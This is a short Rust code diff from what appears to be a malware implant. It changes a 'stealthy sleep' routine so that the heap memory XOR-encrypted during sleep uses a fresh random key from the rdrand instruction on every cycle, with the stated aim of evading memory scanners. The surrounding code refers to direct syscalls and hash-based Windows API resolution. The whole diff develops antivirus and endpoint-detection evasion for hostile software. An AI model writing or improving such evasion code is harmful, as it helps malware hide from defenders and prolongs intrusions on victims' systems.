@@ -4,8 +4,15 @@ use super::syscalls::{sys_nanosleep, Timespec};
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
 
+static mut SLEEP_MASK_KEY: u8 = 0xAA;
+
 /// Performs a stealthy sleep with heap obfuscation.
 pub fn sleep(ms: u64) {
+    // Generate new random key for this sleep cycle
+    unsafe {
+        *core::ptr::addr_of_mut!(SLEEP_MASK_KEY) = get_random_u8();
+    }
+
     // Obfuscation: Encrypt heap memory to evade scanners during sleep
     encrypt_heap();
 
@@ -64,9 +71,8 @@ unsafe fn set_memory_protection(base: *mut u8, size: usize, protect: u32) {
 
 pub fn encrypt_heap() {
     let (heap_start, heap_size) = get_heap_range();
-    let key = 0xAA;
-
     unsafe {
+        let key = *core::ptr::addr_of!(SLEEP_MASK_KEY);
         for i in 0..heap_size {
             let ptr = heap_start.add(i);
             // XOR encryption
@@ -77,6 +83,18 @@ pub fn encrypt_heap() {
 
 pub fn decrypt_heap() {
     encrypt_heap(); // XOR is symmetric
+}
+
+fn get_random_u8() -> u8 {
+    let mut val: u64 = 0;
+    unsafe {
+        core::arch::asm!(
+            "rdrand {}",
+            out(reg) val,
+            options(nomem, nostack)
+        );
+    }
+    (val & 0xFF) as u8
 }
 
 fn get_heap_range() -> (*mut u8, usize) {
